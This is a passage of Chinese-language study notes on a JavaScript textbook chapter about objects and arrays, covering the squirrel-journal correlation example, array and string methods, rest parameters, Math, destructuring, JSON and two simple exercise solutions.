<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> score = &#123;<span class="attr">visitors</span>: <span class="number">0</span>, <span class="attr">home</span>: <span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// This is okay</span></span><br><span class="line">score.visitors = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// This isn't allowed</span></span><br><span class="line">score = &#123;<span class="attr">visitors</span>: <span class="number">1</span>, <span class="attr">home</span>: <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>当用JS的<code>==</code>操作符比较对象时，比较的是对象的同一性（identity）：只在两个对象精确地是同一个值才返回true。比较不同的对象将会返回false，即便他们有相同的属性。JS没有原生的深度比较操作，也就是根据对象的内容去比较，但是你可以自己写一个，这也是本章最后的练习。</p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> journal = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEntry</span>(<span class="params">events, squirrel</span>) </span>&#123;</span><br><span class="line">  journal.push(&#123;events, squirrel&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种添加对象的方式有点奇怪，没有写<code>events: events</code>这样的形式，只给了属性的名字。其实这只是一种缩写，代表了同样的意思。如果一个在花括号中的属性名后面没有跟着属性值，那么它的值将会从相同名字的变量当中获得。</p>
<p>所以，每天晚上10点或者有时候第二天早上，在爬上顶层书架后，雅克记录下一天：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">addEntry([<span class="string">"work"</span>, <span class="string">"touched tree"</span>, <span class="string">"pizza"</span>, <span class="string">"running"</span>,</span><br><span class="line">          <span class="string">"television"</span>], <span class="literal">false</span>);</span><br><span class="line">addEntry([<span class="string">"work"</span>, <span class="string">"ice cream"</span>, <span class="string">"cauliflower"</span>, <span class="string">"lasagna"</span>,</span><br><span class="line">          <span class="string">"touched tree"</span>, <span class="string">"brushed teeth"</span>], <span class="literal">false</span>);</span><br><span class="line">addEntry([<span class="string">"weekend"</span>, <span class="string">"cycling"</span>, <span class="string">"break"</span>, <span class="string">"peanuts"</span>,</span><br><span class="line">          <span class="string">"beer"</span>], <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>有了这些数据，雅克想用统计学办法去找到什么事件于松鼠化相关联。</p>
<p>相关性（correlation）是一种在统计变量中依赖的量度。变量之间的相关性表示位-1到1之间的数字，0表示不相关，1表示完全正相关，-1表示完全负相关（一个为真，另一个为假)。</p>
<p>为了计算两个布尔值之间的相关性，我们可以用phi coefficient (ϕ)。这是一个公式，输入是观测变量的不同组合的次数频率表，输出是-1到1的数字，表示相关性。</p>
<p>我们可以拿吃披萨这个事情举个例子并且把它放在一个频率表里面，在表中，每一个数字表明那个组合在我们的测量中发生的次数。</p>
<p>计算phi值，发现是0.069，很小的值，吃披萨不足以影响变身。</p>
<h2 id="计算相关性"><a href="#计算相关性" class="headerlink" title="计算相关性"></a>计算相关性</h2><p>我们可以将一个2*2的表表示为4个元素的数组([76， 9， 4， 1])。我们也可以使用其他的表示，如含有两个数组元素的数组([[76, 9], [4, 1])。或者是一个对象含有”11”和”01”这样的属性名，但是扁平的数组是更加容易的，并且使得获取表元素的表达式更加简洁。我们将会把索引表示为两位二进制数，比如10代表变身为松鼠，但是event没有发生。因为10代表十进制2，所以把数字存储在数组索引为2的位置。</p>
<p>下面是计算phi系数的函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phi</span>(<span class="params">table</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (table[<span class="number">3</span>] * table[<span class="number">0</span>] - table[<span class="number">2</span>] * table[<span class="number">1</span>]) /</span><br><span class="line">    <span class="built_in">Math</span>.sqrt((table[<span class="number">2</span>] + table[<span class="number">3</span>]) *</span><br><span class="line">              (table[<span class="number">0</span>] + table[<span class="number">1</span>]) *</span><br><span class="line">              (table[<span class="number">1</span>] + table[<span class="number">3</span>]) *</span><br><span class="line">              (table[<span class="number">0</span>] + table[<span class="number">2</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(phi([<span class="number">76</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">1</span>]));</span><br><span class="line"><span class="comment">// → 0.068599434</span></span><br></pre></td></tr></table></figure>
<p>这是计算phi公式的JS表达方式。Math对象的sqrt计算平方根，在标准JS环境中提供。我们必须从我们表中添加两个字段以获取像n1这样的形式。</p>
<p>雅克记录了三个月的日志，结果数据文件存储在JOURNAL绑定中。</p>
<p>为了对每个特定事件提取为2*2的表格，需要循环所有entry，并且计算出事件发生的次数和松鼠化的关系。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tableFor</span>(<span class="params">event, journal</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> table = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; journal.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> entry = journal[i], index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (entry.events.includes(event)) index += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (entry.squirrel) index += <span class="number">2</span>;</span><br><span class="line">    table[index] += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(tableFor(<span class="string">"pizza"</span>, JOURNAL));</span><br><span class="line"><span class="comment">// → [76, 9, 4, 1]</span></span><br></pre></td></tr></table></figure>
<p>因为表示索引的二进制数字的首位代表是否松鼠化，第二位代表相应事件是否发生，所以第一位权重为2，第二位权重为1。首先初始化了要返回的频率表。我们遍历每个entry，如果事件发生了，权重加1，而如果松鼠化了，权重加2.最终，将对应权重的索引相应赋值即可。循环结束后，返回table。</p>
<p>数组有一个includes方法用来检查是否给定值在数组中，类似in操作符在对象中的地位。</p>
<p><code>tableFor</code>返回了对于给定事件的频率表。</p>
<p>剩下的就是对于每种记录的事件去找到是否有某件事件特别突出。</p>
<h2 id="数组循环"><a href="#数组循环" class="headerlink" title="数组循环"></a>数组循环</h2><p>在<code>tableFor</code>函数中，有一个像这样的循环：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; JOURNAL.length; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> entry = JOURNAL[i];</span><br><span class="line">  <span class="comment">// Do something with entry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种类型的循环在JS中很常见，遍历数组每次取出一个元素做操作。</p>
<p>有一种更简洁的方式去书写这种形式的循环：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> entry <span class="keyword">of</span> JOURNAL) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;entry.events.length&#125;</span> events.`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种形式的for循环，将会遍历of后面的元素值。不仅数组可以用，字符串也可以用还有一些其他的数据结构也可以的。我们将会在第六章讨论他的工作机制。</p>
<h2 id="最终分析"><a href="#最终分析" class="headerlink" title="最终分析"></a>最终分析</h2><p>我们需要计算数据集中每种事件的相关性。所以我们首先需要找到每种类型的事件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">journalEvents</span>(<span class="params">journal</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> events = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> entry <span class="keyword">of</span> journal) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> event <span class="keyword">of</span> entry.events) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!events.includes(event)) &#123;</span><br><span class="line">        events.push(event);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> events;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(journalEvents(JOURNAL));</span><br><span class="line"><span class="comment">// → ["carrot", "exercise", "weekend", "bread", …]</span></span><br></pre></td></tr></table></figure>
<p>这个函数就是对journal进行遍历，然后entry里面的events数组再进行遍历，观察是否已经遇到过该事件，如果没遇到，就简单push到数组中。</p>
<p>通过遍历所有事件并把它们添加到events数组中，函数收集了每种类型的事件。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> event <span class="keyword">of</span> journalEvents(JOURNAL)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event + <span class="string">":"</span>, phi(tableFor(event, JOURNAL)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → carrot:   0.0140970969</span></span><br><span class="line"><span class="comment">// → exercise: 0.0685994341</span></span><br><span class="line"><span class="comment">// → weekend:  0.1371988681</span></span><br><span class="line"><span class="comment">// → bread:   -0.0757554019</span></span><br><span class="line"><span class="comment">// → pudding: -0.0648203724</span></span><br><span class="line"><span class="comment">// and so on...</span></span><br></pre></td></tr></table></figure>
<p>如此一来我们可以看到所有事件的相关性了。</p>
<p>大多数的相关性接近于0。我们来筛选结果只展示那些大于0.1或者小于-0.1的结果。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> event <span class="keyword">of</span> journalEvents(JOURNAL)) &#123;</span><br><span class="line">  <span class="keyword">let</span> correlation = phi(tableFor(event, JOURNAL));</span><br><span class="line">  <span class="keyword">if</span> (correlation &gt; <span class="number">0.1</span> || correlation &lt; <span class="number">-0.1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event + <span class="string">":"</span>, correlation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → weekend:        0.1371988681</span></span><br><span class="line"><span class="comment">// → brushed teeth: -0.3805211953</span></span><br><span class="line"><span class="comment">// → candy:          0.1296407447</span></span><br><span class="line"><span class="comment">// → work:          -0.1371988681</span></span><br><span class="line"><span class="comment">// → spaghetti:      0.2425356250</span></span><br><span class="line"><span class="comment">// → reading:        0.1106828054</span></span><br><span class="line"><span class="comment">// → peanuts:        0.5902679812</span></span><br></pre></td></tr></table></figure>
<p>有两个特别显著的影响因素，吃花生表现为强烈的正相关，而刷牙表现为显著负相关。</p>
<p>当雅克吃花生就会变身，而刷牙就会回到原型。如果他不是一个再牙齿卫生方面特别懒散的人，他将不会注意<br>到它的痛苦。</p>
<p>知道了这个，雅克停止吃花生，并且再也没有继续变身。</p>
<h2 id="深度的数组论"><a href="#深度的数组论" class="headerlink" title="深度的数组论"></a>深度的数组论</h2><p>完成这一章之前，介绍更多的对象相关的概念。让我们从一些有用的数组方法开始。</p>
<p>我们学习了push和pop，在数组末尾添加或者移除元素。对应的在数组开头添加或者删除元素的方法是unshift和shift。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> todoList = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remember</span>(<span class="params">task</span>) </span>&#123;</span><br><span class="line">  todoList.push(task);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTask</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> todoList.shift();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rememberUrgently</span>(<span class="params">task</span>) </span>&#123;</span><br><span class="line">  todoList.unshift(task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序管理了一个任务队列，通过调用remember(“groceries”)，当准备做某件事情的时候，调用getTask()去获得并从队列移除头部的元素。rememberUrgently方法也添加一个任务，但是是将任务添加到队首而不是队列尾部。</p>
<p>为了寻找一个特定的值的位置，数组提供了indexOf方法，如果找到返回位置的索引，找不到返回-1。为了从末尾开始搜索，有一类似的方法叫做lastIndexOf。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>].indexOf(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// → 1</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>].lastIndexOf(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// → 3</span></span><br></pre></td></tr></table></figure>

<p>indexOf和lastIndexOf都有一个可选大的第二个参数，表明从哪里开始搜索。</p>
<p>另外一个基本的数组方法是slice，接受起始和终止索引，返回一个数组只包含他们之间的元素。包含start处的元素，但不包含end处元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].slice(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line"><span class="comment">// → [2, 3]</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].slice(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// → [2, 3, 4]</span></span><br></pre></td></tr></table></figure>
<p>当end index没有给定，那么一直到数组末尾。如果起始元素没给定，返回原数组的copy。</p>
<p>concat拼接数组，类似字符串的+操作符。下面是个例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">array, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array.slice(<span class="number">0</span>, index)</span><br><span class="line">    .concat(array.slice(index + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(remove([<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>, <span class="string">"d"</span>, <span class="string">"e"</span>], <span class="number">2</span>));</span><br><span class="line"><span class="comment">// → ["a", "b", "d", "e"]</span></span><br></pre></td></tr></table></figure>
<p>从原数组移除给定位置的元素。</p>
<p>如果传递给concat的参数不是一个数组，那么那个值会简单被添加到数组中，就好像它原来是一个单值数组一样。</p>
<h2 id="字符串和他们的属性"><a href="#字符串和他们的属性" class="headerlink" title="字符串和他们的属性"></a>字符串和他们的属性</h2><p>可以从字符串中读取length和toUpperCase这样的属性，但是想添加一个新属性，是不可以的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> kim = <span class="string">"Kim"</span>;</span><br><span class="line">kim.age = <span class="number">88</span>;</span><br><span class="line"><span class="built_in">console</span>.log(kim.age);</span><br><span class="line"><span class="comment">// → undefined</span></span><br></pre></td></tr></table></figure>
<p>字符串，数字和布尔值不是对象，即便你给他们添加一些新的属性，他们也不会抱怨，而只是简单的忽略。像早先提及的那样，这样的值是immutable的并且不可以被改变。</p>
<p>但是这些类型确实有内建的属性。如字符串的slice和indexOf方法，类似于数组的同名方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"coconuts"</span>.slice(<span class="number">4</span>, <span class="number">7</span>));</span><br><span class="line"><span class="comment">// → nut</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"coconut"</span>.indexOf(<span class="string">"u"</span>));</span><br><span class="line"><span class="comment">// → 5</span></span><br></pre></td></tr></table></figure>

<p>一个区别是，字符串的indexOf方法可以搜索一个包含多个字符的字符串，数组方法只搜索单个元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"one two three"</span>.indexOf(<span class="string">"ee"</span>));</span><br><span class="line"><span class="comment">// → 11</span></span><br></pre></td></tr></table></figure>
<p>字符串的trim方法从字符串的起始和结尾移除空白（space，newlines，tabs和相似的字符）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"  okay \n "</span>.trim());</span><br><span class="line"><span class="comment">// → okay</span></span><br></pre></td></tr></table></figure>

<p>zeroPad函数也作为一个方法存在着。它叫做padStart并且接收想要的填充长度和填充字符作为参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>(<span class="number">6</span>).padStart(<span class="number">3</span>, <span class="string">"0"</span>));</span><br><span class="line"><span class="comment">// → 006</span></span><br></pre></td></tr></table></figure>

<p>可用split方法，以给定字符串分隔字符串，并用join方法将其再拼接起来。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sentence = <span class="string">"Secretarybirds specialize in stomping"</span>;</span><br><span class="line"><span class="keyword">let</span> words = sentence.split(<span class="string">" "</span>);</span><br><span class="line"><span class="built_in">console</span>.log(words);</span><br><span class="line"><span class="comment">// → ["Secretarybirds", "specialize", "in", "stomping"]</span></span><br><span class="line"><span class="built_in">console</span>.log(words.join(<span class="string">". "</span>));</span><br><span class="line"><span class="comment">// → Secretarybirds. specialize. in. stomping</span></span><br></pre></td></tr></table></figure>
<p>字符串可以被重复，用repeat方法，创建一个新的字符串包含原字符串的几份拷贝拼接在一起。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"LA"</span>.repeat(<span class="number">3</span>));</span><br><span class="line"><span class="comment">// -&gt; LALALA</span></span><br></pre></td></tr></table></figure>

<p>我们已经学习了字符串的length属性，获取字符串中的字符就像获取数组元素一样（有一个警告会在第五章讨论）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> string = <span class="string">"abc"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(string.length);</span><br><span class="line"><span class="comment">// → 3</span></span><br><span class="line"><span class="built_in">console</span>.log(string[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// → b</span></span><br></pre></td></tr></table></figure>
<h2 id="REST参数"><a href="#REST参数" class="headerlink" title="REST参数"></a>REST参数</h2><p>对于一个函数来说，接收任意数量的参数是很有用的。比如，Math.max就返回接受的任意参数中最大的那个。</p>
<p>为了实现这个，需要在最后一个参数的前面放三个点号。如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">max</span>(<span class="params">...numbers</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> number <span class="keyword">of</span> numbers) &#123;</span><br><span class="line">    <span class="keyword">if</span> (number &gt; result) result = number;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(max(<span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">-2</span>));</span><br><span class="line"><span class="comment">// → 9</span></span><br></pre></td></tr></table></figure>

<p>当这样的函数被调用的时候，rest parameter（rest参数）就被绑定到一个包含所有参数的数组上了。如果前面还有其它参数，他们的值不会是数组的一部分。在max函数中，rest参数前不包含任何参数，所以它将会保存所有参数。</p>
<p>可以用相似的三点标记来调用一个函数，并提供一个参数数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> numbers = [<span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>];</span><br><span class="line"><span class="built_in">console</span>.log(max(...numbers));</span><br><span class="line"><span class="comment">// → 7</span></span><br></pre></td></tr></table></figure>
<p>这将会将数组伸展开来，将数组元素作为独立参数传递给函数。可以混合这种传参方式和其他参数，如<code>max(9, ...numbers, 2)</code>。</p>
<p>中括号数组标记也允许三点操作符去展开另一个数组到新数组中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> words = [<span class="string">"never"</span>, <span class="string">"fully"</span>];</span><br><span class="line"><span class="built_in">console</span>.log([<span class="string">"will"</span>, ...words, <span class="string">"understand"</span>]);</span><br><span class="line"><span class="comment">// → ["will", "never", "fully", "understand"]</span></span><br></pre></td></tr></table></figure>

<h2 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h2><p>Math就是一个和数学相关工具函数的百宝箱。如Math.max，Math.min和Math.sqrt。</p>
<p>Math对象作为一个容器将一堆相关的函数关联起来。有且仅有一个Math对象，作为一个值的话他是没有任何用途的。同时，还提供了命名空间，所以这些函数和值不需要是全局变量。</p>
<p>有太多的全局绑定会污染命名空间。越多的名字被使用的话，就可能会再将来意外覆盖存在的绑定。比如，可能你在程序中命名了max变量，因为JS内建的max方法在Math对象中，所以我们不担心会重写它。</p>
<p>许多语言会避免或者至少是警告你，如果定义了一个已经使用过的变量名。JS的let和const是这样做的，但是var和function以及标准绑定（standard binding）却没有这种机制。</p>
<p>回到Math对象，关于三角函数，Math对象有cos，sin，tan，asin，acos，atan方法供使用。此外，还有pi的近似Math.PI。关于常量，编程习惯通常是将常量全部写为大写字母。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomPointOnCircle</span>(<span class="params">radius</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> angle = <span class="built_in">Math</span>.random() * <span class="number">2</span> * <span class="built_in">Math</span>.PI;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">x</span>: radius * <span class="built_in">Math</span>.cos(angle),</span><br><span class="line">          y: radius * <span class="built_in">Math</span>.sin(angle)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(randomPointOnCircle(<span class="number">2</span>));</span><br><span class="line"><span class="comment">// → &#123;x: 0.3667, y: 1.966&#125;</span></span><br></pre></td></tr></table></figure>
<p>Math.random返回0到1之间的伪随机数（左闭右开）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line"><span class="comment">// → 0.36993729369714856</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line"><span class="comment">// → 0.727367032552138</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line"><span class="comment">// → 0.40180766698904335</span></span><br></pre></td></tr></table></figure>

<p>虽然计算机是确定性的机器，也就是说，输入相同，输出也相同，但是他们也可能产生一些看上去随机的数字。为了实现这个，计算机会保存一些隐藏值，每当你想要一个随机数，就会根据这个隐藏值执行一系列复杂计算得到一个数字。用这种方式，可以产生全新的难以预测的看上去随机的数字。</p>
<p>如果要产生随机整数，需要结合Math.floor方法，该方法向下取整。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>));</span><br><span class="line"><span class="comment">// → 2</span></span><br></pre></td></tr></table></figure>
<p>该表达式等可能的产生0到9的随机数。</p>
<p>此外还有Math.ceil（向上取整）,Math.round（四舍五入），Math.abs（取绝对值）。</p>
<h2 id="解构（destructuring）"><a href="#解构（destructuring）" class="headerlink" title="解构（destructuring）"></a>解构（destructuring）</h2><p>回忆下phi函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phi</span>(<span class="params">table</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (table[<span class="number">3</span>] * table[<span class="number">0</span>] - table[<span class="number">2</span>] * table[<span class="number">1</span>]) /</span><br><span class="line">    <span class="built_in">Math</span>.sqrt((table[<span class="number">2</span>] + table[<span class="number">3</span>]) *</span><br><span class="line">              (table[<span class="number">0</span>] + table[<span class="number">1</span>]) *</span><br><span class="line">              (table[<span class="number">1</span>] + table[<span class="number">3</span>]) *</span><br><span class="line">              (table[<span class="number">0</span>] + table[<span class="number">2</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种写法有点尴尬。参数是个数组绑定，但是我们更想要数组元素的绑定，如<code>let n00 = table[0]</code>等等。幸运的是，有一种在JS中很简洁的方式去实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phi</span>(<span class="params">[n00, n01, n10, n11]</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (n11 * n00 - n10 * n01) /</span><br><span class="line">    <span class="built_in">Math</span>.sqrt((n10 + n11) * (n00 + n01) *</span><br><span class="line">              (n01 + n11) * (n00 + n10));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于let，var和const声明的绑定都是可以的。如果你知道要绑定的值是数组，就可用方括号去窥探数组里面的值，绑定它的内容。</p>
<p>一个相似的窍门是对于对象，用花括号而不是方括号。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name&#125; = &#123;<span class="attr">name</span>: <span class="string">"Faraji"</span>, <span class="attr">age</span>: <span class="number">23</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(name);</span><br><span class="line"><span class="comment">// → Faraji</span></span><br></pre></td></tr></table></figure>

<p>注意如果尝试解构null或者underfined，会得到一个错误，有点像直接从null或者underfined上面获取属性。</p>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p>因为属性只是grasp它的值，而不是包含他。对象和数组只是以保存地址的位串存储的，也就是他们存放内容的地址。所以一个二维数组对于内层的数组至少包含一块内存区域，外层数组还有一块内存区域，包含着二进制数代表内部数组的位置。</p>
<p>如果你想要将数据保存到文件并用互联网发送它。你不得不将这些内存地址转换为一个可以发送或者存储的描述。</p>
<p>我们能做的就是serialize(序列化)这个数据。意味着将他转换为平的描述（flat description）。一个受欢迎的序列化格式是JSON，代表着JavaScript Object Notation。在web上广泛用于数据存储和通讯格式，甚至是除了JS之外的其他语言。</p>
<p>JSON看上去和JS书写数组和对象的方式很相似，但是有一些限制。所有属性名必须由双引号包裹，并且只能是简单的数据表达式，不允许函数调用，变量或者任何其他涉及到计算的东西。注释不允许在JSON中。</p>
<p>在JSON中，一个日志条目看起来可能像是这样：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"squirrel"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"events"</span>: [<span class="string">"work"</span>, <span class="string">"touched tree"</span>, <span class="string">"pizza"</span>, <span class="string">"running"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JS提供了JSON.stringify和JSON.parse方法。第一种方法接收JS值，返回JSON编码的字符串。第二个接受一个JSON字符串，转换为它译码的JS表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> string = <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">squirrel</span>: <span class="literal">false</span>,</span><br><span class="line">                             events: [<span class="string">"weekend"</span>]&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(string);</span><br><span class="line"><span class="comment">// → &#123;"squirrel":false,"events":["weekend"]&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(string).events);</span><br><span class="line"><span class="comment">// → ["weekend"]</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对象和数组（是一种特殊对象）提供了一种将多个值整合到一个值当中的方法。</p>
<p>大多对象都有属性，除了null和underfined。属性可通过点符号或者中括号标记获取。</p>
<p>可以用特殊形式的for循环遍历数组<code>for(let element of array)</code>。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="范围和"><a href="#范围和" class="headerlink" title="范围和"></a>范围和</h3><p>我们曾见过这样的形式：<code>console.log(sum(range(1, 10)))</code></p>
<p>写一个<code>range</code>函数接收两个参数，start和end，并返回一个数组，包含start元素和end元素的所有数字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">start, end</span>) </span>&#123;</span><br><span class="line">  res = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">    res.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后写一个sum函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    res += i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
